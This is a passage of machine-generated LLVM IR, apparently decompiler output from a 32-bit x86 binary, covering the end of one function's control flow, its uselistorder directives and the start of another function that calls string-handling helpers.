  %v0_8054ec3 = load i32, i32* @esp, align 4
  %v1_8054ec3 = inttoptr i32 %v0_8054ec3 to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v1_8054ec3, align 4
  %v1_8054eca = call i32 @function_80535cf(i32 -1)
  store i32 %v1_8054eca, i32* %eax.global-to-local, align 4
  %v0_8054ecf = load i32, i32* @esp, align 4
  %v1_8054ecf = inttoptr i32 %v0_8054ecf to i32*
  %v2_8054ecf = load i32, i32* %v1_8054ecf, align 4
  store i32 %v2_8054ecf, i32* @eax, align 4
  %v3_8054ecf = add i32 %v0_8054ecf, 4
  %v1_8054ed0 = inttoptr i32 %v3_8054ecf to i32*
  %v2_8054ed0 = load i32, i32* %v1_8054ed0, align 4
  store i32 %v2_8054ed0, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8054ed0, align 4
  %v0_8054ed3 = load i32, i32* @esi, align 4
  store i32 %v0_8054ed3, i32* %v1_8054ecf, align 4
  %v0_8054ed4 = load i32, i32* @global_var_8063f78.398, align 8
  store i32 %v0_8054ed4, i32* %ebx.global-to-local, align 4
  %v2_8054eda = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054eda, i32* %eax.global-to-local, align 4
  %v0_8054edf = load i32, i32* @esp, align 4
  %v1_8054edf = add i32 %v0_8054edf, 16
  %v1_8054ee2 = add i32 %v0_8054ed4, -1
  store i32 %v1_8054ee2, i32* @ebx, align 4
  %v1_8054ee3 = add i32 %v0_8054edf, 52
  %v2_8054ee3 = inttoptr i32 %v1_8054ee3 to i32*
  %v3_8054ee3 = load i32, i32* %v2_8054ee3, align 4
  %v5_8054ee3 = sub i32 %v3_8054ee3, %v1_8054ee2
  %v11_8054ee3 = xor i32 %v3_8054ee3, %v1_8054ee2
  %v12_8054ee3 = xor i32 %v5_8054ee3, %v3_8054ee3
  %v13_8054ee3 = and i32 %v12_8054ee3, %v11_8054ee3
  %v14_8054ee3 = icmp slt i32 %v13_8054ee3, 0
  %v16_8054ee3 = icmp slt i32 %v5_8054ee3, 0
  %v2_8054ee7 = icmp eq i1 %v16_8054ee3, %v14_8054ee3
  br i1 %v2_8054ee7, label %dec_label_pc_8054eef, label %dec_label_pc_8054ee9

dec_label_pc_8054ee9:                             ; preds = %dec_label_pc_8054eab
  %v4_8054ee9 = add i32 %v3_8054ee3, 1
  store i32 %v4_8054ee9, i32* %v2_8054ee3, align 4
  br label %dec_label_pc_8054f10.backedge

dec_label_pc_8054eef:                             ; preds = %dec_label_pc_8054b78, %dec_label_pc_8054eab, %dec_label_pc_8054ea4, %dec_label_pc_8054b8f
  %v1_8054efc = phi i32 [ %v1_8054edf, %dec_label_pc_8054eab ], [ %v1_8054eab, %dec_label_pc_8054ea4 ], [ %v1_8054bcb, %dec_label_pc_8054b8f ], [ %v0_8054eef.pre, %dec_label_pc_8054b78 ]
  %v1_8054eef = add i32 %v1_8054efc, 40
  %v2_8054eef = inttoptr i32 %v1_8054eef to i32*
  %v3_8054eef = load i32, i32* %v2_8054eef, align 4
  %v1_8054ef3 = add i32 %v3_8054eef, 1
  store i32 %v1_8054ef3, i32* %eax.global-to-local, align 4
  %v1_8054ef4 = ashr i32 %v1_8054ef3, 31
  store i32 %v1_8054ef4, i32* %edx.global-to-local, align 4
  %v1_8054ef5 = add i32 %v1_8054efc, 248
  %v2_8054ef5 = inttoptr i32 %v1_8054ef5 to i32*
  %v3_8054ef5 = load i32, i32* %v2_8054ef5, align 4
  %v5_8054ef5 = zext i32 %v1_8054ef3 to i64
  %v7_8054ef5 = zext i32 %v1_8054ef4 to i64
  %v8_8054ef5 = mul nuw i64 %v7_8054ef5, 4294967296
  %v9_8054ef5 = or i64 %v8_8054ef5, %v5_8054ef5
  %v10_8054ef5 = zext i32 %v3_8054ef5 to i64
  %v11_8054ef5 = sdiv i64 %v9_8054ef5, %v10_8054ef5
  %v12_8054ef5 = trunc i64 %v11_8054ef5 to i32
  store i32 %v12_8054ef5, i32* %eax.global-to-local, align 4
  %v13_8054ef5 = srem i64 %v9_8054ef5, %v10_8054ef5
  %v14_8054ef5 = trunc i64 %v13_8054ef5 to i32
  store i32 %v14_8054ef5, i32* %edx.global-to-local, align 4
  store i32 %v14_8054ef5, i32* %v2_8054eef, align 4
  %v1_8054f00 = icmp eq i32 %v14_8054ef5, 0
  %v1_8054f02 = icmp eq i1 %v1_8054f00, false
  br i1 %v1_8054f02, label %dec_label_pc_8054f08, label %dec_label_pc_8054f04

dec_label_pc_8054f04:                             ; preds = %dec_label_pc_8054eef
  %v0_8054f04 = load i32, i32* @esp, align 4
  %v1_8054f04 = add i32 %v0_8054f04, 28
  %v2_8054f04 = inttoptr i32 %v1_8054f04 to i32*
  %v3_8054f04 = load i32, i32* %v2_8054f04, align 4
  %v4_8054f04 = add i32 %v3_8054f04, 1
  store i32 %v4_8054f04, i32* %v2_8054f04, align 4
  br label %dec_label_pc_8054f08

dec_label_pc_8054f08:                             ; preds = %dec_label_pc_8054eef, %dec_label_pc_8054f04
  %v0_8054f08 = load i32, i32* @esp, align 4
  %v1_8054f08 = add i32 %v0_8054f08, 36
  %v2_8054f08 = inttoptr i32 %v1_8054f08 to i32*
  store i32 -1, i32* %v2_8054f08, align 4
  br label %dec_label_pc_8054f10.backedge

dec_label_pc_8054f10.backedge:                    ; preds = %dec_label_pc_8054f08, %dec_label_pc_8054b86, %dec_label_pc_8054c74, %dec_label_pc_8054ee9
  %v0_8054f10.pre = load i32, i32* @esp, align 4
  %v1_8054f10 = add i32 %v0_8054f10.pre, 28
  %v2_8054f10 = inttoptr i32 %v1_8054f10 to i32*
  %v3_8054f10 = load i32, i32* %v2_8054f10, align 4
  %tmp116 = icmp ult i32 %v3_8054f10, 3
  br i1 %tmp116, label %dec_label_pc_8054970, label %dec_label_pc_8054f35

dec_label_pc_8054f35:                             ; preds = %dec_label_pc_80548ea, %dec_label_pc_8054986, %dec_label_pc_8054a7a, %dec_label_pc_8054f10.backedge, %dec_label_pc_805488c, %dec_label_pc_80548c4, %dec_label_pc_80548cc, %dec_label_pc_80548da
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_80548da ], [ -1, %dec_label_pc_80548cc ], [ -1, %dec_label_pc_80548c4 ], [ -1, %dec_label_pc_805488c ], [ %v0_8054937, %dec_label_pc_8054f10.backedge ], [ %v0_8054937, %dec_label_pc_8054a7a ], [ %v0_8054937, %dec_label_pc_8054986 ], [ %v0_8054937, %dec_label_pc_80548ea ]
  %v0_8054f35 = call i32 @function_8053b78()
  store i32 %v0_8054f35, i32* %eax.global-to-local, align 4
  %v1_8054f3a = inttoptr i32 %v0_8054f35 to i32*
  store i32 -1, i32* %v1_8054f3a, align 4
  %v0_8054f40 = load i32, i32* @esp, align 4
  %v1_8054f40 = add i32 %v0_8054f40, 44
  %v2_8054f40 = inttoptr i32 %v1_8054f40 to i32*
  %v3_8054f40 = load i32, i32* %v2_8054f40, align 4
  store i32 %v3_8054f40, i32* %eax.global-to-local, align 4
  %v2_8054f44 = add i32 %v0_8054f40, 56
  %v3_8054f44 = inttoptr i32 %v2_8054f44 to i32*
  store i32 %v3_8054f40, i32* %v3_8054f44, align 4
  br label %dec_label_pc_8054f48

dec_label_pc_8054f48:                             ; preds = %dec_label_pc_8054cad, %dec_label_pc_8054c85, %dec_label_pc_8054f35
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8054f35 ], [ %v0_8054937, %dec_label_pc_8054cad ], [ %v0_8054937, %dec_label_pc_8054c85 ]
  %v0_8054f48 = load i32, i32* @esp, align 4
  %v1_8054f48 = add i32 %v0_8054f48, 20
  %v2_8054f48 = inttoptr i32 %v1_8054f48 to i32*
  %v3_8054f48 = load i32, i32* %v2_8054f48, align 4
  %v13_8054f48 = icmp eq i32 %v3_8054f48, -1
  br i1 %v13_8054f48, label %dec_label_pc_8054f48.dec_label_pc_8054f5e_crit_edge, label %dec_label_pc_8054f4f

dec_label_pc_8054f48.dec_label_pc_8054f5e_crit_edge: ; preds = %dec_label_pc_8054f48
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8054f5e

dec_label_pc_8054f4f:                             ; preds = %dec_label_pc_8054f48
  %v3_8054f52 = load i32, i32* %v2_8054f48, align 4
  %v5_8054f52 = add i32 %v0_8054f48, -16
  %v6_8054f52 = inttoptr i32 %v5_8054f52 to i32*
  store i32 %v3_8054f52, i32* %v6_8054f52, align 4
  %v1_8054f56 = sext i16 %stack_var_-192.1 to i32
  %v2_8054f56 = call i32 @function_8050138(i32 %v1_8054f56)
  store i32 %v2_8054f56, i32* %eax.global-to-local, align 4
  %v0_8054f5b = load i32, i32* @esp, align 4
  %v1_8054f5b = add i32 %v0_8054f5b, 16
  br label %dec_label_pc_8054f5e

dec_label_pc_8054f5e:                             ; preds = %dec_label_pc_8054f48.dec_label_pc_8054f5e_crit_edge, %dec_label_pc_8054f4f
  %v1_8054f65.pre-phi = phi i32 [ %.pre, %dec_label_pc_8054f48.dec_label_pc_8054f5e_crit_edge ], [ %v1_8054f56, %dec_label_pc_8054f4f ]
  %v0_8054f5e = phi i32 [ %v0_8054f48, %dec_label_pc_8054f48.dec_label_pc_8054f5e_crit_edge ], [ %v1_8054f5b, %dec_label_pc_8054f4f ]
  %v1_8054f61 = add i32 %v0_8054f5e, 12
  %v2_8054f61 = inttoptr i32 %v1_8054f61 to i32*
  %v3_8054f61 = load i32, i32* %v2_8054f61, align 4
  %v5_8054f61 = add i32 %v0_8054f5e, -16
  %v6_8054f61 = inttoptr i32 %v5_8054f61 to i32*
  store i32 %v3_8054f61, i32* %v6_8054f61, align 4
  %v2_8054f65 = call i32 @function_8052915(i32 %v1_8054f65.pre-phi)
  store i32 %v2_8054f65, i32* %eax.global-to-local, align 4
  %v1_8054f6a = load i32, i32* @esp, align 4
  %v2_8054f6a = inttoptr i32 %v1_8054f6a to i32*
  store i32 %v1_80548a2, i32* %v2_8054f6a, align 4
  %v2_8054f6d = call i32 @function_8052915(i32 %v1_8054f65.pre-phi)
  store i32 %v2_8054f6d, i32* @eax, align 4
  %v0_8054f72 = load i32, i32* @esp, align 4
  %v1_8054f75 = add i32 %v0_8054f72, 32
  %v2_8054f75 = inttoptr i32 %v1_8054f75 to i32*
  store i32 -1, i32* %v2_8054f75, align 4
  %v0_8054f7d = load i32, i32* @esp, align 4
  %v1_8054f7d = add i32 %v0_8054f7d, 40
  %v2_8054f7d = inttoptr i32 %v1_8054f7d to i32*
  %v3_8054f7d = load i32, i32* %v2_8054f7d, align 4
  %v13_8054f7d = icmp eq i32 %v3_8054f7d, -1
  br i1 %v13_8054f7d, label %dec_label_pc_8054fd1, label %dec_label_pc_8054f84

dec_label_pc_8054f84:                             ; preds = %dec_label_pc_8054f5e
  %v0_8054f84 = load i32, i32* @ecx, align 4
  %v2_8054f84 = add i32 %v0_8054f7d, -4
  %v3_8054f84 = inttoptr i32 %v2_8054f84 to i32*
  store i32 %v0_8054f84, i32* %v3_8054f84, align 4
  %v1_8054f85 = add i32 %v0_8054f7d, -8
  %v2_8054f85 = inttoptr i32 %v1_8054f85 to i32*
  store i32 ptrtoint (i32* @global_var_8063b28.395 to i32), i32* %v2_8054f85, align 4
  %v1_8054f8a = add i32 %v0_8054f7d, -12
  %v2_8054f8a = inttoptr i32 %v1_8054f8a to i32*
  store i32 134559183, i32* %v2_8054f8a, align 4
  %v1_8054f8f = add i32 %v0_8054f7d, 184
  store i32 %v1_8054f8f, i32* %ebx.global-to-local, align 4
  %v2_8054f96 = add i32 %v0_8054f7d, -16
  %v3_8054f96 = inttoptr i32 %v2_8054f96 to i32*
  store i32 %v1_8054f8f, i32* %v3_8054f96, align 4
  %v3_8054f97 = call i32 @function_80535d2(i32 %v1_8054f65.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8054f97, i32* %eax.global-to-local, align 4
  %v0_8054f9c = load i32, i32* @esp, align 4
  %v1_8054f9c = inttoptr i32 %v0_8054f9c to i32*
  store i32 ptrtoint (i32* @global_var_8063b28.395 to i32), i32* %v1_8054f9c, align 4
  %v2_8054fa3 = call i32 @function_80535cf(i32 %v1_8054f65.pre-phi)
  store i32 %v2_8054fa3, i32* %eax.global-to-local, align 4
  %v0_8054fa8 = load i32, i32* @esp, align 4
  %v1_8054fa8 = add i32 %v0_8054fa8, 56
  %v2_8054fa8 = inttoptr i32 %v1_8054fa8 to i32*
  %v3_8054fa8 = load i32, i32* %v2_8054fa8, align 4
  store i32 %v3_8054fa8, i32* %edx.global-to-local, align 4
  %v1_8054fac = add i32 %v0_8054fa8, 72
  %v2_8054fac = inttoptr i32 %v1_8054fac to i32*
  %v3_8054fac = load i32, i32* %v2_8054fac, align 4
  store i32 %v3_8054fac, i32* %eax.global-to-local, align 4
  %v1_8054fb0 = sext i32 %v3_8054fa8 to i64
  store i64 %v1_8054fb0, i64* @global_var_8063b40.396, align 64
  %v1_8054fb6 = trunc i32 %v3_8054fac to i16
  store i16 %v1_8054fb6, i16* @global_var_805d884.397, align 4
  %v1_8054fbc = inttoptr i32 %v0_8054fa8 to i32*
  %v2_8054fbc = load i32, i32* %v1_8054fbc, align 4
  store i32 %v2_8054fbc, i32* @eax, align 4
  %v3_8054fbc = add i32 %v0_8054fa8, 4
  %v1_8054fbd = inttoptr i32 %v3_8054fbc to i32*
  %v2_8054fbd = load i32, i32* %v1_8054fbd, align 4
  store i32 %v2_8054fbd, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8054fbd, align 4
  %v0_8054fc0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054fc0, i32* %v1_8054fbc, align 4
  %v3_8054fc1 = call i32 @function_80535d2(i32 %v1_8054f65.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8054fc1, i32* %eax.global-to-local, align 4
  %v0_8054fc6 = load i32, i32* @esp, align 4
  %v1_8054fc6 = add i32 %v0_8054fc6, 32
  %v2_8054fc6 = inttoptr i32 %v1_8054fc6 to i32*
  store i32 -1, i32* %v2_8054fc6, align 4
  br label %dec_label_pc_8054fce

dec_label_pc_8054fce:                             ; preds = %dec_label_pc_8054e42, %dec_label_pc_8054f84
  %v0_8054fce = load i32, i32* @esp, align 4
  %v1_8054fce = add i32 %v0_8054fce, 16
  br label %dec_label_pc_8054fd1

dec_label_pc_8054fd1:                             ; preds = %dec_label_pc_8054f5e, %dec_label_pc_8054fce
  %v0_8054fd1 = phi i32 [ %v0_8054f7d, %dec_label_pc_8054f5e ], [ %v1_8054fce, %dec_label_pc_8054fce ]
  %v1_8054fd1 = add i32 %v0_8054fd1, 16
  %v2_8054fd1 = inttoptr i32 %v1_8054fd1 to i32*
  %v3_8054fd1 = load i32, i32* %v2_8054fd1, align 4
  store i32 %v3_8054fd1, i32* %eax.global-to-local, align 4
  %v1_8054fd5 = add i32 %v0_8054fd1, 220
  %v1_8054fdb = inttoptr i32 %v1_8054fd5 to i32*
  %v2_8054fdb = load i32, i32* %v1_8054fdb, align 4
  store i32 %v2_8054fdb, i32* @ebx, align 4
  %v3_8054fdb = add i32 %v0_8054fd1, 224
  %v1_8054fdc = inttoptr i32 %v3_8054fdb to i32*
  %v2_8054fdc = load i32, i32* %v1_8054fdc, align 4
  store i32 %v2_8054fdc, i32* @esi, align 4
  %v3_8054fdc = add i32 %v0_8054fd1, 228
  %v1_8054fdd = inttoptr i32 %v3_8054fdc to i32*
  %v2_8054fdd = load i32, i32* %v1_8054fdd, align 4
  store i32 %v2_8054fdd, i32* @edi, align 4
  %v3_8054fdd = add i32 %v0_8054fd1, 232
  %v1_8054fde = inttoptr i32 %v3_8054fdd to i32*
  %v2_8054fde = load i32, i32* %v1_8054fde, align 4
  store i32 %v2_8054fde, i32* @ebp, align 4
  ret i32 %v3_8054fd1

; uselistorder directives
  uselistorder i32 %v0_8054fd1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8054fa8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054f7d, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8054f5e, { 1, 0 }
  uselistorder i32 %v1_8054f65.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8054f10.pre, { 1, 0 }
  uselistorder i32 %v5_8054ee3, { 1, 0 }
  uselistorder i32 %v3_8054ee3, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8054eab, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8054e74, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054e42, { 1, 0 }
  uselistorder i32 %v3_8054e21, { 1, 0, 2 }
  uselistorder i32 %v0_8054e12, { 1, 0 }
  uselistorder i32 %v5_8054e08, { 1, 0 }
  uselistorder i32* %v3_8054e08, { 1, 0 }
  uselistorder i32 %v0_8054cde78, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8054e08, { 2, 1, 0 }
  uselistorder i32 %v5_8054e02, { 1, 0 }
  uselistorder i32 %v1_8054e01, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8054dfd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054dc1, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8054d9b, { 1, 0 }
  uselistorder i32 %v1_8054d8c, { 1, 0 }
  uselistorder i32 %v0_8054d4b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8054cf2, { 1, 2, 0 }
  uselistorder i32 %v0_8054cf2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8054ccc, { 1, 0 }
  uselistorder i32 %v1_8054cc6, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8054cc1, { 1, 2, 0 }
  uselistorder i32 %v5_8054ccc57, { 1, 0 }
  uselistorder i32 %v5_8054c6e, { 1, 0 }
  uselistorder i32 %v3_8054c6e, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8054c26, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054c0c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8054c0c, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8054beb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8054bcb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8054b71, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8054b56, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8054b3f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8054ac7, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054ab4, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8054a7a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8054a5b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8054a3f, { 1, 0 }
  uselistorder i32 %v3_8054a34, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8054a31, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80549d6, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80549d1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80549ba, { 1, 0 }
  uselistorder i32 %v1_8054986, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805497788, { 2, 1, 0 }
  uselistorder i32 %v3_805498f, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8054937, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8054930, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8054911, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_80548da, { 1, 0, 2 }
  uselistorder i32 %v1_80548a2, { 6, 10, 4, 2, 7, 9, 5, 1, 0, 8, 11, 3, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 3, 2, 0 }
  uselistorder i32 68, { 6, 0, 3, 4, 5, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051cd4, { 0, 4, 3, 2, 1 }
  uselistorder i32 10000, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 232, { 1, 2, 0 }
  uselistorder i32 228, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051d08, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 101, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_8051c40, { 1, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051dbc, { 1, 2, 0 }
  uselistorder i32 17, { 5, 4, 6, 3, 1, 0, 2 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @function_80518b4, { 0, 2, 1 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 224, { 1, 3, 2, 0 }
  uselistorder i32 220, { 2, 3, 1, 0 }
  uselistorder i32 216, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @function_8055b34, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 39, 40, 41, 37, 38, 28, 29, 30, 31, 32, 33, 34, 35, 36, 42, 43 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 36, 38, 35, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 37, 27, 26, 25, 24, 23, 22, 21, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 -8, { 8, 2, 1, 3, 0, 4, 5, 6, 7, 9, 37, 35, 36, 34, 15, 16, 10, 11, 12, 13, 14, 17, 18, 19, 20, 27, 26, 25, 24, 23, 22, 21, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -16, { 14, 15, 16, 5, 7, 8, 4, 6, 3, 9, 2, 10, 11, 12, 13, 17, 53, 54, 23, 24, 18, 19, 20, 21, 22, 25, 26, 1, 27, 28, 42, 43, 44, 41, 38, 39, 40, 37, 36, 35, 34, 32, 33, 29, 30, 31, 45, 0, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i16* @global_var_805d884.397, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8063b40.396, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8063b28.395 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 14, 5, 15, 16, 7, 9, 0, 1, 2, 3, 10, 11, 12, 6, 13, 4, 8 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054fd1, { 1, 0 }
  uselistorder label %dec_label_pc_8054fce, { 1, 0 }
  uselistorder label %dec_label_pc_8054f5e, { 1, 0 }
  uselistorder label %dec_label_pc_8054f48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054f35, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8054f10.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054f08, { 1, 0 }
  uselistorder label %dec_label_pc_8054eef, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054ea4, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8054e42, { 1, 0 }
  uselistorder label %dec_label_pc_8054e12, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8054e08, { 1, 0 }
  uselistorder label %dec_label_pc_8054dfd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054dfa, { 1, 0 }
  uselistorder label %dec_label_pc_8054d75, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054cbd, { 1, 0 }
  uselistorder label %dec_label_pc_8054b3f, { 1, 0 }
  uselistorder label %dec_label_pc_8054b08, { 1, 0 }
  uselistorder label %dec_label_pc_8054a7a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054986, { 1, 0 }
  uselistorder label %dec_label_pc_8054970, { 1, 0 }
}

define i32 @function_8054fe0() local_unnamed_addr {
dec_label_pc_8054fe0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8054fe0 = load i32, i32* @ebp, align 4
  store i32 134559183, i32* %stack_var_-216, align 4
  %v3_8054fef = ptrtoint i32* %stack_var_-216 to i32
  %v2_8054ff4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054ff4, i32* @eax, align 4
  %v2_8054ffc = call i32 @function_80535d2(i32 %v2_8054ff4, i32 134559183)
  %v1_8055008 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d888.337 to i32))
  store i32 %v1_8055008, i32* @eax, align 4
  %v0_8055010 = load i32, i32* @global_var_8063f74.338, align 4
  %tmp41 = icmp slt i32 %v0_8055010, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8055207, label %dec_label_pc_805501d

dec_label_pc_805501d:                             ; preds = %dec_label_pc_8054fe0
  store i32 ptrtoint (i32* @global_var_805c950.400 to i32), i32* %stack_var_-216, align 4
  %v2_8055029 = call i32 @function_80553f8(i32 ptrtoint ([17 x i8]* @global_var_805c91e.401 to i32), i32 ptrtoint (i32* @global_var_805c950.400 to i32))
  store i32 %v2_8055029, i32* @eax, align 4
  store i32 %v2_8055029, i32* @ebp, align 4
  %v1_8055033 = icmp eq i32 %v2_8055029, 0
  %v1_8055035 = icmp eq i1 %v1_8055033, false
  br i1 %v1_8055035, label %dec_label_pc_80551d2.preheader, label %dec_label_pc_805503b

dec_label_pc_805503b:                             ; preds = %dec_label_pc_805501d
  store i32 ptrtoint (i32* @global_var_805c950.400 to i32), i32* %stack_var_-216, align 4
  %v2_8055047 = call i32 @function_80553f8(i32 ptrtoint ([24 x i8]* @global_var_805c92f.402 to i32), i32 ptrtoint (i32* @global_var_805c950.400 to i32))
  store i32 %v2_8055047, i32* @ebp, align 4
  %v1_8055051 = icmp eq i32 %v2_8055047, 0
  %v1_8055053 = icmp eq i1 %v1_8055051, false
  br i1 %v1_8055053, label %dec_label_pc_80551d2.preheader, label %dec_label_pc_80551fc

dec_label_pc_80551d2.preheader:                   ; preds = %dec_label_pc_805501d, %dec_label_pc_805503b
  %v2_80551d9 = ptrtoint i32* %stack_var_-180 to i32
  %v3_805510d = add i32 %v3_8054fef, 164
  %v0_80551d299 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80551d9, i32* @ebx, align 4
  %v3_80551de100 = call i32 @function_805581c(i32 %v2_80551d9, i32 128, i32 %v0_80551d299)
  store i32 %v3_80551de100, i32* @eax, align 4
  %v1_80551e6101 = icmp eq i32 %v3_80551de100, 0
  %v1_80551e8102 = icmp eq i1 %v1_80551e6101, false
  br i1 %v1_80551e8102, label %dec_label_pc_805505f.preheader.lr.ph, label %dec_label_pc_80551ee

dec_label_pc_805505f.preheader.lr.ph:             ; preds = %dec_label_pc_80551d2.preheader
  %v4_80550f7 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805505f.preheader

dec_label_pc_805505e:                             ; preds = %dec_label_pc_8055069
  %v1_805505e = add i32 %v0_805505e55, 1
  store i32 %v1_805505e, i32* @ebx, align 4
  %v1_805505f = inttoptr i32 %v1_805505e to i8*
  %v2_805505f = load i8, i8* %v1_805505f, align 1
  %v3_805505f = zext i8 %v2_805505f to i32
  %v5_805505f = and i32 %v6_805505f58, -256
  %v6_805505f = or i32 %v3_805505f, %v5_805505f
  store i32 %v6_805505f, i32* @ecx, align 4
  %v4_8055061 = icmp eq i8 %v2_805505f, 0
  br i1 %v4_8055061, label %dec_label_pc_80551d2.backedge, label %dec_label_pc_8055069

